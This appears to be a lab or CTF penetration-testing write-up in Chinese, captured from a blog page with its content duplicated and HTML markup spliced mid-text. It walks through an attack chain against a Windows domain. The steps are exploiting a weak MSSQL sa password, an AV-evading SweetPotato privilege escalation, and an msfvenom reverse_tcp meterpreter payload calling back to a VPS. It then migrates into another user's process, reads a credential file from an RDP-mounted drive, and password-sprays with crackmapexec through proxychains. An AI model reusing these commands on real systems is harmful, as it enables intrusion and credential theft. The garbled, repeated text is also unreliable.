+ 2432  5268  explorer.exe       x64   2        WIN-WEB\John                   C:\Windows\explorer.exe
+ 2592  824   sihost.exe         x64   2        WIN-WEB\John                   C:\Windows\System32\sihost.ex
+                                                                              e
+ 2692  540   msdtc.exe          x64   0
+ 2732  7088  argusagent.exe     x64   0
+ 2824  540   sqlceip.exe        x64   0        NT SERVICE\SSISTELEMETRY130
+ 2832  540   sqlceip.exe        x64   0        NT SERVICE\SSASTELEMETRY
+ 2840  540   sqlservr.exe       x64   0        NT SERVICE\MSSQLSERVER
+ 2848  540   sqlceip.exe        x64   0        NT SERVICE\SQLTELEMETRY
+ 2856  540   MsDtsSrvr.exe      x64   0        NT SERVICE\MsDtsServer130
+ 2868  540   ReportingServices  x64   0        NT SERVICE\ReportServer
+             Service.exe
+ 2876  540   svchost.exe        x64   2        WIN-WEB\John                   C:\Windows\System32\svchost.e
+                                                                              xe
+ 2924  824   taskhostw.exe      x64   2        WIN-WEB\John                   C:\Windows\System32\taskhostw
+                                                                              .exe
+ 3024  540   msmdsrv.exe        x64   0        NT SERVICE\MSSQLServerOLAPSer
+                                               vice
+ 3076  2864  winlogon.exe       x64   3
+ 3384  7112  AliYunDunMonitor.  x86   0
+             exe
+ 3520  540   svchost.exe        x64   0
+ 3784  7016  jucheck.exe        x86   2        WIN-WEB\John                   C:\Program Files (x86)\Common
+                                                                               Files\Java\Java Update\juche
+                                                                              ck.exe
+ 3880  2868  Microsoft.Reporti
+             ngServices.Portal
+             .WebHost.exe
+ 3888  3880  conhost.exe
+ 3896  652   ShellExperienceHo  x64   2        WIN-WEB\John                   C:\Windows\SystemApps\ShellEx
+             st.exe                                                           perienceHost_cw5n1h2txyewy\Sh
+                                                                              ellExperienceHost.exe
+ 4204  540   mpdwsvc.exe        x64   0
+ 4212  540   mpdwsvc.exe        x64   0
+ 4496  540   fdlauncher.exe     x64   0        NT SERVICE\MSSQLFDLauncher
+ 4520  4496  fdhost.exe         x64   0        NT SERVICE\MSSQLFDLauncher     C:\Program Files\Microsoft SQ
+                                                                              L Server\MSSQL13.MSSQLSERVER\
+                                                                              MSSQL\Binn\fdhost.exe
+ 4528  4520  conhost.exe
+ 4532  8104  e22b16cetcp.exe    x64   3        WIN-WEB\mj                     C:\Users\Public\e22b16cetcp.e
+                                                                              xe
+ 4768  652   WmiPrvSE.exe
+ 4832  832   rdpclip.exe
+ 4876  652   RuntimeBroker.exe
+ 4900  2864  csrss.exe
+ 4928  472   LogonUI.exe        x64   1
+ 4988  8132  jucheck.exe
+ 5004  5228  explorer.exe
+ 5280  652   WmiPrvSE.exe
+ 5464  652   ChsIME.exe         x64   2        WIN-WEB\John                   C:\Windows\System32\InputMeth
+                                                                              od\CHS\ChsIME.exe
+ 5500  540   AliYunDunUpdate.e  x86   0
+             xe
+ 5564  5004  msf.exe            x64   3        WIN-WEB\mj                     C:\msf.exe
+ 5624  5812  dwm.exe
+ 5636  540   aliyun_assist_ser  x64   0
+             vice.exe
+ 5768  1868  w3wp.exe           x64   0        IIS APPPOOL\DefaultAppPool     C:\Windows\System32\inetsrv\w
+                                                                              3wp.exe
+ 5776  5984  csrss.exe
+ 5812  5984  winlogon.exe       x64   2
+ 5860  8104  conhost.exe        x64   3        WIN-WEB\mj                     C:\Windows\System32\conhost.e
+                                                                              xe
+ 5868  652   WmiPrvSE.exe
+ 6248  824   taskhostw.exe
+ 6604  540   svchost.exe        x64   3        WIN-WEB\mj
+ 6712  540   svchost.exe        x64   0
+ 6784  7048  conhost.exe        x64   0
+ 6864  824   taskhostw.exe      x64   2        WIN-WEB\John                   C:\Windows\System32\taskhostw
+                                                                              .exe
+ 7016  6972  jusched.exe        x86   2        WIN-WEB\John                   C:\Program Files (x86)\Common
+                                                                               Files\Java\Java Update\jusch
+                                                                              ed.exe
+ 7036  540   argusagent_servic  x64   0
+             e.exe
+ 7048  6464  argusagent.exe     x64   0
+ 7088  7048  cmd.exe            x64   0
+ 7112  540   AliYunDun.exe      x86   0
+ 7296  540   svchost.exe        x64   0
+ 7628  824   taskhostw.exe      x64   3        WIN-WEB\mj                     C:\Windows\System32\taskhostw
+                                                                              .exe
+ 7908  652   dllhost.exe
+ 8056  652   ChsIME.exe
+ 8104  4876  cmd.exe            x64   3        WIN-WEB\mj                     C:\Windows\System32\cmd.exe
+ 8132  8096  jusched.exe
+
+meterpreter > migrate 7016
+[*] Migrating from 5564 to 7016...
+[*] Migration completed successfully.
+meterpreter > shell
+Process 6868 created.
+Channel 1 created.
+Microsoft Windows [�汾 10.0.14393]
+(c) 2016 Microsoft Corporation����������Ȩ����
+
+C:\Windows\SysWOW64>chcp 65001
+chcp 65001
+Active code page: 65001
+
+C:\Windows\SysWOW64>whoami
+whoami
+win-web\john
+
+C:\Windows\SysWOW64>quesr
+quesr
+'quesr' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\SysWOW64>quser
+quser
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>john                  rdp-tcp#0           2  Active         26  2026/9/10 8:58
+ mj                    rdp-tcp#6           3  Active          3  2026/9/10 9:05
+
+C:\Windows\SysWOW64>net use
+net use
+New connections will be remembered.
+
+
+Status       Local     Remote                    Network
+
+-------------------------------------------------------------------------------
+                       \\TSCLIENT\C              Microsoft Terminal Services
+The command completed successfully.
+</code></pre>
+<p>读到凭据和hint</p>
+<pre><code>C:\Windows\SysWOW64>type \\TSCLIENT\C\*.txt
+type \\TSCLIENT\C\*.txt
+
+\\TSCLIENT\C\credential.txt
+
+
+xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#
+
+Do you know how to hijack Image?
+</code></pre>
+<p>域内就这几台机器撞一下密码看看哪个能登上去</p>
+<pre><code class='language-bash'>┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc crackmapexec smb 172.22.8.15 172.22.8.31 172.22.8.46 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  172.22.8.46:445  ...  172.22.8.31:445  ...  OK
+ ...  OK
+ ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  172.22.8.31:445 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  OK
+ ...  172.22.8.46:135  ...  OK
+ ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001 SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
+[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:135  ...  172.22.8.46:445  ...  172.22.8.31:135  ...  OK
+ ...  OK
+ ...  OK
+SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
+SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
+SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK
+SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.31:445  ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.31:445  ...  OK
+SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRE
+</code></pre>
+<p>紫色代表密码过期登上去需要修改一下,不过DC还是上不去的，我上了46</p>
+<pre><code>C:\Users\Aldrich>net group 'Domain Admins' /domain
+这项请求将在域 xiaorang.lab 的域控制器处理。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://faabbi.github.io/post/Tsclient.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
+<title>Tsclient</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Tsclient</h1>
+<div class="title-right">
+    <a href="https://faabbi.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/faabbi/faabbi.github.io/issues/42" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody">
+
+<h1>外网</h1>
+<p>很简单的外网入口，也很流水线</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# fscan -h 39.99.226.61
+<hr>
+</code><p><code class="notranslate">/ _ \     ___  ___ _ __ __ _  <strong><em>| | __<br>
+/ /</em>/</strong><em><em>/ <strong>|/ | '/ <em>` |/ __| |/ /<br>
+/ /</em>\</strong>____</em> \ (__| | | (</em>| | (<strong>|   &lt;<br>
+_</strong><em>/     |</em><strong>/_</strong>|<em>|  _</em>,<em>|___|</em>|_<br>
+fscan version: 1.8.4<br>
+start infoscan<br>
+39.99.226.61:1433 open<br>
+39.99.226.61:135 open<br>
+39.99.226.61:80 open<br>
+39.99.226.61:139 open<br>
+[<em>] alive ports len is: 4<br>
+start vulscan<br>
+[</em>] NetInfo<br>
+[<em>]39.99.226.61<br>
+[-&gt;]WIN-WEB<br>
+[-&gt;]172.22.8.18<br>
+[-&gt;]2001:0:14c9:d206:34cf:356:d89c:1dc2<br>
+[</em>] WebTitle <a href="http://39.99.226.61" rel="nofollow">http://39.99.226.61</a>       code:200 len:703    title:IIS Windows Server<br>
+[+] mssql 39.99.226.61:1433:sa 1qaz!QAZ<br>
+</code></p></pre><p></p>
+<p>sql server 弱密码，直接连上去拿shell就行了</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6b37b918-84e5-4833-b32b-4a9f6fddeda1"><img width="1559" height="889" alt="Image" src="https://github.com/user-attachments/assets/6b37b918-84e5-4833-b32b-4a9f6fddeda1" style="max-width: 100%; height: auto; max-height: 889px;; aspect-ratio: 1559 / 889; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
+<pre class="notranslate"><code class="notranslate">$ tasklist
+映像名称                       PID 会话名              会话#       内存使用 
+========================= ======== ================ =========== ============
+System Idle Process              0                            0          4 K
+System                           4                            0        136 K
+smss.exe                       244                            0      1,216 K
+csrss.exe                      336                            0      6,052 K
+wininit.exe                    412                            0      5,704 K
+csrss.exe                      420                            1      5,832 K
+winlogon.exe                   472                            1     13,764 K
+services.exe                   540                            0      7,820 K
+lsass.exe                      548                            0     17,184 K
+svchost.exe                    652                            0     19,536 K
+svchost.exe                    712                            0      9,560 K
+dwm.exe                        808                            1     30,348 K
+svchost.exe                    824                            0    303,368 K
+svchost.exe                    832                            0     56,504 K
+svchost.exe                    920                            0     21,956 K
+svchost.exe                    988                            0     24,740 K
+svchost.exe                    304                            0     16,440 K
+svchost.exe                    424                            0     20,484 K
+svchost.exe                   1040                            0     27,884 K
+svchost.exe                   1052                            0      7,432 K
+svchost.exe                   1200                            0     11,276 K
+svchost.exe                   1548                            0      6,916 K
+spoolsv.exe                   1608                            0     21,772 K
+svchost.exe                   1704                            0     10,720 K
+svchost.exe                   1824                            0      8,364 K
+svchost.exe                   1856                            0     18,152 K
+svchost.exe                   1872                            0     11,200 K
+svchost.exe                   1868                            0     11,624 K
+svchost.exe                   1884                            0     26,968 K
+sqlwriter.exe                 1892                            0      8,028 K
+svchost.exe                   1908                            0     17,904 K
+sqlceip.exe                   2824                            0     37,164 K
+sqlceip.exe                   2832                            0     54,124 K
+sqlservr.exe                  2840                            0    407,752 K
+sqlceip.exe                   2848                            0     50,232 K
+MsDtsSrvr.exe                 2856                            0     24,372 K
+ReportingServicesService.     2868                            0     87,036 K
+msmdsrv.exe                   3024                            0     52,516 K
+svchost.exe                   3228                            0      7,716 K
+Microsoft.ReportingServic     3880                            0     85,980 K
+conhost.exe                   3888                            0     10,732 K
+mpdwsvc.exe                   4204                            0    193,332 K
+mpdwsvc.exe                   4212                            0    328,096 K
+fdlauncher.exe                4496                            0      5,184 K
+fdhost.exe                    4520                            0      6,624 K
+conhost.exe                   4528                            0      9,024 K
+WmiPrvSE.exe                  4768                            0     15,760 K
+LogonUI.exe                   4928                            1     44,688 K
+TrustedInstaller.exe          4464                            0    237,084 K
+TiWorker.exe                  2028                            0    192,972 K
+WmiPrvSE.exe                  5280                            0      8,308 K
+AliYunDunUpdate.exe           5500                            0      9,648 K
+svchost.exe                   5704                            0     13,100 K
+WmiPrvSE.exe                  1904                            0      8,928 K
+aliyun_assist_service.exe     5636                            0     24,520 K
+w3wp.exe                      5768                            0     14,388 K
+csrss.exe                     5776                            2      5,832 K
+winlogon.exe                  5812                            2      8,140 K
+dwm.exe                       5624                            2     31,224 K
+rdpclip.exe                    480                            2     13,264 K
+RuntimeBroker.exe             2040                            2     22,316 K
+sihost.exe                    2592                            2     18,824 K
+svchost.exe                   2876                            2     18,812 K
+taskhostw.exe                 2924                            2     15,396 K
+ChsIME.exe                    5464                            2     16,324 K
+explorer.exe                  2432                            2     60,552 K
+ShellExperienceHost.exe       3896                            2     35,576 K
+SearchUI.exe                  1112                            2     36,652 K
+backgroundTaskHost.exe        6872                            2     23,948 K
+jusched.exe                   7016                            2      7,116 K
+AliYunDun.exe                 7112                            0     15,260 K
+argusagent_service.exe        7036                            0      8,388 K
+argusagent.exe                7048                            0      9,900 K
+conhost.exe                   6784                            0      7,292 K
+cmd.exe                       7088                            0      2,764 K
+argusagent.exe                2732                            0     80,580 K
+AliYunDunMonitor.exe          3384                            0     20,692 K
+msdtc.exe                     2692                            0     10,076 K
+cmd.exe                       2632                            0      2,772 K
+conhost.exe                   6484                            0      9,660 K
+tasklist.exe                  7040                            0      7,824 K
+</code></pre>
+<p>重点可以看到阿里云盾，土豆得过一下免杀，不过免杀的土豆，总是没法指定参数，所以自己写死加个管理员编译免杀就行</p>
+<pre class="notranslate"><code class="notranslate">$ C:\Users\Public\error.exe
+SweetPotato by @_EthicalChaos_
+  Orignal RottenPotato code and exploit by @foxglovesec
+  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
+  PrintSpoofer discovery and original exploit by @itm4n
+  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
+[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
+[+] Triggering notification on evil PIPE \\WIN-WEB/pipe/b67b39f2-87cf-4c56-8e73-c092f93fc69c
+[+] Server connected to our evil RPC pipe
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching program
+[+] Process created, enjoy!
+</code></pre>
+<p>rdp上去就行了</p>
+<h1>内网</h1>
+<p>上线一下vshell搭个隧道，这里我fscan扫一下没什么能进去的服务，就大概猜到开始域渗透了，毕竟是刚入门，跟着wp打了</p>
+<markdown-accessiblity-table><table role="table">
+<thead>
+<tr>
+<th>IP</th>
+<th>主机名</th>
+<th>域</th>
+<th>操作系统</th>
+<th>关键信息</th>
+<th> </th>
+<th> </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>172.22.8.15</td>
+<td>DC01</td>
+<td>xiaorang.lab</td>
+<td>Windows Server 2022 / Build 10.0.20348</td>
+<td>疑似域控，开放 DNS、LDAP、RDP、SMB、RPC 等</td>
+<td> </td>
+<td> </td>
+</tr>
+<tr>
+<td>172.22.8.31</td>
+<td>WIN19-CLIENT</td>
+<td>xiaorang.lab</td>
+<td>Windows Server 2019 / Windows 10 Build 17763</td>
+<td>开放 RDP、SMB、RPC 等</td>
+<td> </td>
+<td> </td>
+</tr>
+<tr>
+<td>172.22.8.46</td>
+<td>WIN2016</td>
+<td>xiaorang.lab</td>
+<td>Windows 10 1607 / Windows Server 2016 Build 14393</td>
+<td>开放 IIS、RDP、SMB、RPC 等</td>
+<td> </td>
+<td> </td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p>生成个马子</p>
+<pre class="notranslate"><code class="notranslate">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=vpsip LPORT=9999 -f exe -o msf.exe
+</code></pre>
+<pre class="notranslate"><code class="notranslate">msf &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set lhost vps
+msf exploit(multi/handler) &gt; set lport 10002
+lport =&gt; 10002
+msf exploit(multi/handler) &gt; run
+[*] Started reverse TCP handler on 0.0.0.0:10002
+</code></pre>
+<p>这里看大佬们讲是Tsclient，默认rdp连接远程机时不会挂载本地机的任何盘符，这里john rdp连我们控的这台机器，设置了挂载它本地的c盘，所以迁移到john用户可以读到31的盘</p>
+<p>下面这几个命令就能明显显示出来为什么以john身份登录还是看不到挂载的盘，涉及到进程迁移，找到john的进程迁移过去然后以john令牌开shell就行了，这里我看文章都没有讲，大概是自己刚入门win这方面</p>
+<pre class="notranslate"><code class="notranslate">meterpreter &gt; shell
+Process 1616 created.
+Channel 14 created.
+Microsoft Windows [�汾 10.0.14393]
+(c) 2016 Microsoft Corporation����������Ȩ����
+<p>C:\Windows\system32&gt;chcp 65001<br>
+chcp 65001<br>
+Active code page: 65001</p>
+<p>C:\Windows\system32&gt;whoami<br>
+whoami<br>
+win-web\john</p>
+<p>C:\Windows\system32&gt;net use<br>
+net use<br>
+New connections will be remembered.</p>
+<p>There are no entries in the list.</p>
+<p>C:\Windows\system32&gt;dir \tsclient\C<br>
+dir \tsclient\C<br>
+The network name cannot be found.</p>
+<p>C:\Windows\system32&gt;dir \tsclient\C$<br>
+dir \tsclient\C$<br>
+The network name cannot be found.</p>
+<p>C:\Windows\system32&gt;quser<br>
+quser<br>
+USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME<br>
+john                  rdp-tcp#0           2  Active         25  2026/9/10 8:58</p>
+<blockquote>
+<p>mj                    rdp-tcp#6           3  Active          2  2026/9/10 9:05</p>
+</blockquote>
+<p>C:\Windows\system32&gt;exit<br>
+exit<br>
+meterpreter &gt; ps</p>
+<h1>Process List</h1>
+<p>PID   PPID  Name               Arch  Session  User                           Path</p>
+<hr>
+<p>0     0     [System Process]<br>
+4     0     System             x64   0<br>
+244   4     smss.exe           x64   0<br>
+304   540   svchost.exe        x64   0<br>
+336   328   csrss.exe<br>
+344   652   ChsIME.exe<br>
+412   328   wininit.exe        x64   0<br>
+420   404   csrss.exe<br>
+424   540   svchost.exe        x64   0<br>
+472   404   winlogon.exe       x64   1<br>
+480   832   rdpclip.exe        x64   2        WIN-WEB\John                   C:\Windows\System32\rdpclip.e<br>
+xe<br>
+540   412   services.exe       x64   0<br>
+548   412   lsass.exe          x64   0<br>
+652   540   svchost.exe        x64   0<br>
+712   540   svchost.exe        x64   0<br>
+784   652   SearchUI.exe<br>
+808   472   dwm.exe<br>
+824   540   svchost.exe        x64   0<br>
+832   540   svchost.exe        x64   0<br>
+920   540   svchost.exe        x64   0<br>
+988   540   svchost.exe        x64   0<br>
+1040  540   svchost.exe        x64   0<br>
+1052  540   svchost.exe        x64   0<br>
+1112  652   SearchUI.exe       x64   2        WIN-WEB\John                   C:\Windows\SystemApps\Microso<br>
+ft.Windows.Cortana_cw5n1h2txy<br>
+ewy\SearchUI.exe<br>
+1420  3076  dwm.exe<br>
+1548  540   svchost.exe        x64   0<br>
+1608  540   spoolsv.exe        x64   0<br>
+1704  540   svchost.exe        x64   0<br>
+1712  652   ShellExperienceHo<br>
+st.exe<br>
+1824  540   svchost.exe        x64   0<br>
+1856  540   svchost.exe        x86   0<br>
+1868  540   svchost.exe        x64   0<br>
+1872  540   svchost.exe        x64   0<br>
+1884  540   svchost.exe        x64   0<br>
+1892  540   sqlwriter.exe      x64   0<br>
+1908  540   svchost.exe        x64   0<br>
+2012  824   sihost.exe<br>
+2040  652   RuntimeBroker.exe  x64   2        WIN-WEB\John                   C:\Windows\System32\RuntimeBr<br>
+oker.exe<br>
+2432  5268  explorer.exe       x64   2        WIN-WEB\John                   C:\Windows\explorer.exe<br>
+2592  824   sihost.exe         x64   2        WIN-WEB\John                   C:\Windows\System32\sihost.ex<br>
+e<br>
+2692  540   msdtc.exe          x64   0<br>
+2732  7088  argusagent.exe     x64   0<br>
+2824  540   sqlceip.exe        x64   0        NT SERVICE\SSISTELEMETRY130<br>
+2832  540   sqlceip.exe        x64   0        NT SERVICE\SSASTELEMETRY<br>
+2840  540   sqlservr.exe       x64   0        NT SERVICE\MSSQLSERVER<br>
+2848  540   sqlceip.exe        x64   0        NT SERVICE\SQLTELEMETRY<br>
+2856  540   MsDtsSrvr.exe      x64   0        NT SERVICE\MsDtsServer130<br>
+2868  540   ReportingServices  x64   0        NT SERVICE\ReportServer<br>
+Service.exe<br>
+2876  540   svchost.exe        x64   2        WIN-WEB\John                   C:\Windows\System32\svchost.e<br>
+xe<br>
+2924  824   taskhostw.exe      x64   2        WIN-WEB\John                   C:\Windows\System32\taskhostw<br>
+.exe<br>
+3024  540   msmdsrv.exe        x64   0        NT SERVICE\MSSQLServerOLAPSer<br>
+vice<br>
+3076  2864  winlogon.exe       x64   3<br>
+3384  7112  AliYunDunMonitor.  x86   0<br>
+exe<br>
+3520  540   svchost.exe        x64   0<br>
+3784  7016  jucheck.exe        x86   2        WIN-WEB\John                   C:\Program Files (x86)\Common<br>
+Files\Java\Java Update\juche<br>
+ck.exe<br>
+3880  2868  Microsoft.Reporti<br>
+ngServices.Portal<br>
+.WebHost.exe<br>
+3888  3880  conhost.exe<br>
+3896  652   ShellExperienceHo  x64   2        WIN-WEB\John                   C:\Windows\SystemApps\ShellEx<br>
+st.exe                                                           perienceHost_cw5n1h2txyewy\Sh<br>
+ellExperienceHost.exe<br>
+4204  540   mpdwsvc.exe        x64   0<br>
+4212  540   mpdwsvc.exe        x64   0<br>
+4496  540   fdlauncher.exe     x64   0        NT SERVICE\MSSQLFDLauncher<br>
+4520  4496  fdhost.exe         x64   0        NT SERVICE\MSSQLFDLauncher     C:\Program Files\Microsoft SQ<br>
+L Server\MSSQL13.MSSQLSERVER<br>
+MSSQL\Binn\fdhost.exe<br>
+4528  4520  conhost.exe<br>
+4532  8104  e22b16cetcp.exe    x64   3        WIN-WEB\mj                     C:\Users\Public\e22b16cetcp.e<br>
+xe<br>
+4768  652   WmiPrvSE.exe<br>
+4832  832   rdpclip.exe<br>
+4876  652   RuntimeBroker.exe<br>
+4900  2864  csrss.exe<br>
+4928  472   LogonUI.exe        x64   1<br>
+4988  8132  jucheck.exe<br>
+5004  5228  explorer.exe<br>
+5280  652   WmiPrvSE.exe<br>
+5464  652   ChsIME.exe         x64   2        WIN-WEB\John                   C:\Windows\System32\InputMeth<br>
+od\CHS\ChsIME.exe<br>
+5500  540   AliYunDunUpdate.e  x86   0<br>
+xe<br>
+5564  5004  msf.exe            x64   3        WIN-WEB\mj                     C:\msf.exe<br>
+5624  5812  dwm.exe<br>
+5636  540   aliyun_assist_ser  x64   0<br>
+vice.exe<br>
+5768  1868  w3wp.exe           x64   0        IIS APPPOOL\DefaultAppPool     C:\Windows\System32\inetsrv\w<br>
+3wp.exe<br>
+5776  5984  csrss.exe<br>
+5812  5984  winlogon.exe       x64   2<br>
+5860  8104  conhost.exe        x64   3        WIN-WEB\mj                     C:\Windows\System32\conhost.e<br>
+xe<br>
+5868  652   WmiPrvSE.exe<br>
+6248  824   taskhostw.exe<br>
+6604  540   svchost.exe        x64   3        WIN-WEB\mj<br>
+6712  540   svchost.exe        x64   0<br>
+6784  7048  conhost.exe        x64   0<br>
+6864  824   taskhostw.exe      x64   2        WIN-WEB\John                   C:\Windows\System32\taskhostw<br>
+.exe<br>
+7016  6972  jusched.exe        x86   2        WIN-WEB\John                   C:\Program Files (x86)\Common<br>
+Files\Java\Java Update\jusch<br>
+ed.exe<br>
+7036  540   argusagent_servic  x64   0<br>
+e.exe<br>
+7048  6464  argusagent.exe     x64   0<br>
+7088  7048  cmd.exe            x64   0<br>
+7112  540   AliYunDun.exe      x86   0<br>
+7296  540   svchost.exe        x64   0<br>
+7628  824   taskhostw.exe      x64   3        WIN-WEB\mj                     C:\Windows\System32\taskhostw<br>
+.exe<br>
+7908  652   dllhost.exe<br>
+8056  652   ChsIME.exe<br>
+8104  4876  cmd.exe            x64   3        WIN-WEB\mj                     C:\Windows\System32\cmd.exe<br>
+8132  8096  jusched.exe</p>
+<p>meterpreter &gt; migrate 7016<br>
+[<em>] Migrating from 5564 to 7016...<br>
+[</em>] Migration completed successfully.<br>
+meterpreter &gt; shell<br>
+Process 6868 created.<br>
+Channel 1 created.<br>
+Microsoft Windows [�汾 10.0.14393]<br>
+(c) 2016 Microsoft Corporation����������Ȩ����</p>
+<p>C:\Windows\SysWOW64&gt;chcp 65001<br>
+chcp 65001<br>
+Active code page: 65001</p>
+<p>C:\Windows\SysWOW64&gt;whoami<br>
+whoami<br>
+win-web\john</p>
+<p>C:\Windows\SysWOW64&gt;quesr<br>
+quesr<br>
+'quesr' is not recognized as an internal or external command,<br>
+operable program or batch file.</p>
+<p>C:\Windows\SysWOW64&gt;quser<br>
+quser<br>
+USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</p>
+<blockquote>
+<p>john                  rdp-tcp#0           2  Active         26  2026/9/10 8:58<br>
+mj                    rdp-tcp#6           3  Active          3  2026/9/10 9:05</p>
+</blockquote>
+<p>C:\Windows\SysWOW64&gt;net use<br>
+net use<br>
+New connections will be remembered.</p>
+<p>Status       Local     Remote                    Network</p>
+<hr>
+<pre class="notranslate"><code class="notranslate">                   \\TSCLIENT\C              Microsoft Terminal Services
+</code></pre>
+</code><p><code class="notranslate">The command completed successfully.<br>
+</code></p></pre><p></p>
+<p>读到凭据和hint</p>
+<pre class="notranslate"><code class="notranslate">C:\Windows\SysWOW64&gt;type \\TSCLIENT\C\*.txt
+type \\TSCLIENT\C\*.txt
+<p>\TSCLIENT\C\credential.txt</p>
+<p>xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</p>
+</code><p><code class="notranslate">Do you know how to hijack Image?<br>
+</code></p></pre><p></p>
+<p>域内就这几台机器撞一下密码看看哪个能登上去</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc crackmapexec smb 172.22.8.15 172.22.8.31 172.22.8.46 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  172.22.8.46:445  ...  172.22.8.31:445  ...  OK
+ ...  OK
+ ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  172.22.8.31:445 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  OK
+ ...  172.22.8.46:135  ...  OK
+ ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001 SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
